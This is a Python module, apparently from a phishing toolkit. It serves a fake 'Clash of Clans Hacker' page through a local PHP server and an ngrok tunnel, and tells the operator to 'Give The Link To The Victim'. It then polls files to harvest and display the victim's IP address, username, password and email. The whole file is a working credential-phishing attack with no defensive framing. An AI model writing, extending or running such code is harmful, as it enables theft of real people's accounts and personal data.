### Importing Modules ###
from pyngrok import ngrok
from subprocess import Popen
from colorama import Fore
import time
import os



###### 06 Clash Of Clans Hacker ######
def ClashOfClans():

    ### Title ###
    print("\n"+Fore.LIGHTGREEN_EX+"["+Fore.LIGHTMAGENTA_EX+"@"+Fore.LIGHTGREEN_EX+"]"+Fore.LIGHTCYAN_EX+" Fake Clash of Clans Hacker :")
    print("\n"+Fore.LIGHTGREEN_EX+"["+Fore.LIGHTMAGENTA_EX+"$"+Fore.LIGHTGREEN_EX+"]"+Fore.LIGHTCYAN_EX+" Loading...", end="")



    ### Starting ###
    with open("log/server.txt", "w") as phplog:
        Popen(("php","-S","localhost:6060","-t","modules/index/06/"),stderr=phplog,stdout=phplog)
        Link = ngrok.connect(6060, "http")
        print("\b"*11+Fore.LIGHTCYAN_EX+" Link |", str(Link).replace("nel: \"http:","nel: \"https:"))
        print("\n"+Fore.LIGHTGREEN_EX+"["+Fore.LIGHTMAGENTA_EX+"!"+Fore.LIGHTGREEN_EX+"]"+Fore.LIGHTCYAN_EX+" Give The Link To The Victim\n")



        ### Internet Protocol ###
        def IP():
            FS = 0
            if not int(os.stat('modules/index/06/ip_data.txt').st_size) == int(FS):
                ip_file = open('modules/index/06/ip_data.txt', 'r')
                ip = ip_file.read()
                ip_file.close()
                print(Fore.LIGHTGREEN_EX+"["+Fore.LIGHTMAGENTA_EX+"!"+Fore.LIGHTGREEN_EX+"]"+Fore.LIGHTCYAN_EX+" IP Found!\n")
                print(Fore.LIGHTGREEN_EX+"["+Fore.LIGHTMAGENTA_EX+"~"+Fore.LIGHTGREEN_EX+"]"+Fore.LIGHTCYAN_EX+" IP : "+ip+"\n")
                ip_clear = open('modules/index/06/ip_data.txt', 'w')
                ip_clear.write('')
                ip_clear.close()



        ### UserName & Password ###
        def UP():
            FS = 0
            if not int(os.stat('modules/index/06/u_data.txt').st_size) == int(FS):

                # password #
                p_file = open('modules/index/06/p_data.txt', 'r')
                p = p_file.read()
                p_file.close()


                # username #
                u_file = open('modules/index/06/u_data.txt', 'r')
                u = u_file.read()
                u_file.close()


                # email #
                e_file = open('modules/index/06/e_data.txt', 'r')
                e = e_file.read()
                e_file.close()


                # print #
                print(Fore.LIGHTGREEN_EX+"["+Fore.LIGHTMAGENTA_EX+"!"+Fore.LIGHTGREEN_EX+"]"+Fore.LIGHTCYAN_EX+" UserName / Password / Email Found!\n")
                print(Fore.LIGHTGREEN_EX+"["+Fore.LIGHTMAGENTA_EX+"~"+Fore.LIGHTGREEN_EX+"]"+Fore.LIGHTCYAN_EX+" User Name :",u+"\n")
                print(Fore.LIGHTGREEN_EX+"["+Fore.LIGHTMAGENTA_EX+"~"+Fore.LIGHTGREEN_EX+"]"+Fore.LIGHTCYAN_EX+" Password :",p+"\n")
                print(Fore.LIGHTGREEN_EX+"["+Fore.LIGHTMAGENTA_EX+"~"+Fore.LIGHTGREEN_EX+"]"+Fore.LIGHTCYAN_EX+" Email :",e+"\n")


                # clear-username #
                u_clear = open('modules/index/06/u_data.txt', 'w')
                u_clear.write('')
                u_clear.close()


                # clear-password #
                p_clear = open('modules/index/06/p_data.txt', 'w')
                p_clear.write('')
                p_clear.close()


                # clear-email #
                e_clear = open('modules/index/06/e_data.txt', 'w')
                e_clear.write('')
                e_clear.close()



        ### Checking ###
        while True:
            IP();
            UP();
            time.sleep(1)
